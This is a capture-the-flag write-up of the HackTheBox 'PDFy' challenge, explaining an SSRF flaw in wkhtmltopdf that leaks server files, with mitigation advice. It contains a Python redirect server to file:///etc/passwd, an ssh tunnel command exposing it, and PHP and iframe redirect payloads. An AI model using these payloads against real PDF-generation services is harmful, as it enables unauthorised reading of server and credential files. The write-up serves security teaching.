# HackTheBox PDFy Web Challenge - Complete Writeup

![[Pasted image 20250513181036.png]]

## Challenge Overview

**Name:** PDFy  
**Category:** Web  
**Difficulty:** Easy  
**Description:**

> Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content!  
> **NOTE:** Leak /etc/passwd to get the flag!

## Technical Background

### The Vulnerability

PDFy is vulnerable to Server-Side Request Forgery (SSRF) due to its utilization of the wkhtmltopdf library. The challenge explicitly tells us we need to leak the contents of `/etc/passwd` to get the flag, indicating this is likely an SSRF challenge.

### What is wkhtmltopdf?

wkhtmltopdf is a command-line tool that renders HTML into PDF documents using the Qt WebKit rendering engine. It's commonly used in web applications that need to generate PDF reports or document conversions.

you can see it in app by entering a wrong url : 

![[Pasted image 20250513180930.png]]

### The Vulnerability (CVE-2022-35583)

wkhtmltopdf has a known vulnerability (CVE-2022-35583) where it follows HTTP redirects to `file://` URIs without appropriate validation. This allows attackers to redirect requests to local files, which can lead to information disclosure.

## Reconnaissance

Upon accessing the application, we see a simple interface allowing users to convert web pages to PDFs:

![[Pasted image 20250513181156.png]]

1. The user inputs a URL
2. The application fetches that URL and renders it to a PDF using wkhtmltopdf
3. The PDF is stored at `/static/pdfs/[filename].pdf` and made available for download

Through initial testing with legitimate URLs (like google.com), we can see the application successfully converts webpages to PDFs.

![[Pasted image 20250513181319.png]]

## Analyzing the Application

By examining the application behavior, we can determine:

1. The application accepts a URL as input via a JSON payload with a `url` field
2. It passes this URL to wkhtmltopdf for rendering
3. Error messages reveal the use of wkhtmltopdf in the backend
4. The application doesn't appear to have proper URL validation

## Exploitation Strategy

The exploitation strategy involves:

1. Creating a web server that responds with a redirect to `file:///etc/passwd`
2. Making the PDFy application request our malicious server
3. wkhtmltopdf will follow the redirect to the local file
4. The contents of `/etc/passwd` will be included in the generated PDF

## Detailed Exploitation Steps

### Step 1: Create a Redirect Server

We set up a simple HTTP server that redirects all requests to `file:///etc/passwd`. Since PHP wasn't available in my local, we used Python:

```python
import http.server
import socketserver

class RedirectHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print("Received request - redirecting to file:///etc/passwd")
        self.send_response(302)
        self.send_header("Location", "file:///etc/passwd")
        self.end_headers()

PORT = 8081
Handler = RedirectHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Server running at port {PORT}")
    httpd.serve_forever()
```

This server listens on port 8081 and responds to all GET requests with a 302 redirect to `file:///etc/passwd`.

![[Pasted image 20250513182039.png]]

### Step 2: Expose the Local Server to the Internet

Since our server is running locally, we need to make it accessible to the PDFy application. We used localhost.run to create a secure tunnel:

```bash
ssh -R 80:localhost:8081 nokey@localhost.run
```

This command creates a tunnel that forwards traffic from a public URL (provided by localhost.run) to our local server on port 8081. In our case, we received the URL `https://9ba152a3947672.lhr.life`.

![[Pasted image 20250513182017.png]]

### Step 3: Submit the Malicious URL to PDFy

We submitted our public URL (`https://9ba152a3947672.lhr.life`) to the PDFy application.

![[Pasted image 20250513181949.png]]

### Step 4: PDFy Processes the Request

When PDFy receives our URL:

1. It passes the URL to wkhtmltopdf for rendering
2. wkhtmltopdf sends a GET request to our server
3. Our server responds with a 302 redirect to `file:///etc/passwd`
4. wkhtmltopdf follows this redirect and attempts to render the local file
5. The contents of `/etc/passwd` are included in the generated PDF

![[Pasted image 20250513181906.png]]

### Step 5: Download and View the PDF

After the PDFy application generates the PDF, we download and open it. The PDF contains the contents of `/etc/passwd` from the target server, including the flag

![[Pasted image 20250513180806.png]]

## Technical Explanation of the Vulnerability

The vulnerability exists because:

1. **Improper URL Validation**: The application doesn't validate or sanitize the URL input
2. **Redirect Handling**: wkhtmltopdf follows HTTP redirects without proper validation
3. **Protocol Handling**: wkhtmltopdf allows access to the `file://` URI scheme, which should never be accessible from a web-driven PDF generator

When wkhtmltopdf follows a redirect to a `file://` URI, it attempts to read the file from the local filesystem of the server running the wkhtmltopdf process. This allows attackers to read sensitive files from the server.

![[Pasted image 20250513201949.png]]

## Alternative Exploitation Approaches

### Using PHP (if available)

```php
<?php
header("Location: file:///etc/passwd");
?>
```

### Using iframes (also effective)

An alternative approach would be to use an iframe in HTML:

```html
<iframe src="http://your-server/redirect.php?x=/etc/passwd" width="1000px" height="1000px"></iframe>
```

Where `redirect.php` contains:

```php
<?php 
header('location:file://'.$_REQUEST['x']); 
?>
```

## Mitigation Recommendations

To prevent this type of vulnerability, developers should:

1. **Implement URL Validation**: Only allow specific URL schemes (http, https) and domains
2. **Disable File Protocol**: Explicitly disable the `file://` protocol in wkhtmltopdf with the `--disable-local-file-access` flag
3. **Use a Whitelist Approach**: Only allow conversion of URLs from trusted domains
4. **Update Libraries**: Keep wkhtmltopdf and other dependencies updated to patched versions
5. **Run in Isolation**: Run the PDF generation process in a containerized environment with minimal privileges

## Lessons Learned

1. **Always Validate User Input**: Any user-controlled input that affects server-side operations must be properly validated and sanitized
2. **Understand Your Tools**: Understanding the security implications of libraries like wkhtmltopdf is critical
3. **Protocol Security**: Special attention should be paid to applications that handle multiple URL protocols
4. **Defense in Depth**: Multiple layers of protection are needed when dealing with user-controlled URLs

## Conclusion

The PDFy challenge demonstrates a common vulnerability in web applications that generate PDFs from HTML content. By exploiting the SSRF vulnerability in wkhtmltopdf, we were able to read sensitive files from the target server and obtain the flag.

This type of vulnerability is particularly dangerous because it can lead to information disclosure, internal network scanning, and potentially remote code execution. Understanding how to identify and exploit such vulnerabilities is crucial for web application security testing.

## Appendix: References

- [CVE-2022-35583](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/5249) - wkhtmltopdf vulnerability details
- [wkhtmltopdf SSRF](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/) - Exploit documentation
- [HackTheBox PDFy Challenge](https://app.hackthebox.com/challenges/pdfy) - Original challenge (requires HTB account)
- [localhost.run](https://localhost.run/) - Tool used for exposing local server